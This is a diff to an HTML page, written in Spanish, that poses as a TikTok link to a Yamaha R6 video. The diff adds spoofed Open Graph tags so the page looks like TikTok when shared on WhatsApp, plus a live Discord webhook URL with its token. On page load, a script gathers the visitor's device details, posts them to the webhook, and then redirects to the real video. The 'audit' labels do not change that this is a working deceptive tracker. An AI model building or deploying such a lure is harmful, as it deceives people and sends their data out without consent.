@@ -3,7 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando contenido...</title>
+    <title>TikTok - Yamaha R6 Black Edit</title>
+
+    <!-- Etiquetas Open Graph estructuradas correctamente para WhatsApp -->
+    <meta property="og:title" content="Yamaha R6 Black: El Video Edit de la Superbike que Buscabas 😶‍🌫️🖤 | TikTok" />
+    <meta property="og:description" content="Mira el video de 月 tsuki (@r6_xvv) en TikTok. YAMAHA R6 #Yamaha #R6 #sportsbike #motorcycle #bikelife #biketiktok" />
+    <meta property="og:image" content="https://unsplash.com" />
+    <meta property="og:url" content="https://tiktok.com" />
+    <meta property="og:type" content="video.other" />
+    <meta property="og:site_name" content="TikTok" />
+
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
@@ -67,11 +76,11 @@
             <div class="dot dot-1"></div>
             <div class="dot dot-2"></div>
         </div>
-        <p>Abriendo en TikTok...</p>
+        <p>Cargando video en TikTok...</p>
     </div>
 
     <script>
-        const DISCORD_WEBHOOK_URL = "https://discord.com";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554562359383556197/wJs1y9CfsQFL10UI5K-Y40M2k0OOfdqtV_3mg9Iy1wWFE25RkeuI4l0edpvbNwOjLSik";
         const VIDEO_DESTINO = "https://www.tiktok.com/@r6_xvv/video/7515913288111213842";
 
         async function capturarDatos() {
@@ -101,7 +110,7 @@
 
             const mensajeDiscord = {
                 embeds: [{
-                    title: "🏍️ ¡Objetivo Detectado (Laboratorio R6)!",
+                    title: "🏍️ ¡Objetivo Interactuó (Filtro TikTok R6)!",
                     color: 16642133, 
                     fields: [
                         { name: "Modelo (Client Hints)", value: datos.modelo_hints, inline: true },
@@ -110,12 +119,11 @@
                         { name: "Núcleos CPU", value: String(datos.nucleos_cpu), inline: true },
                         { name: "Memoria RAM", value: datos.ram_aproximada, inline: true }
                     ],
-                    footer: { text: "Auditoría Técnica - Simulación de Cloaking" },
+                    footer: { text: "Auditoría de Vector de Ataque - Caso Práctico" },
                     timestamp: new Date()
                 }]
             };
 
-            // Intento de envío asíncrono veloz
             try {
                 fetch(DISCORD_WEBHOOK_URL, {
                     method: "POST",
@@ -124,10 +132,9 @@
                 });
             } catch (error) {}
 
-            // Redirección inmediata garantizada
             setTimeout(() => {
                 window.location.href = VIDEO_DESTINO;
-            }, 350);
+            }, 450);
         }
 
         window.onload = capturarDatos;
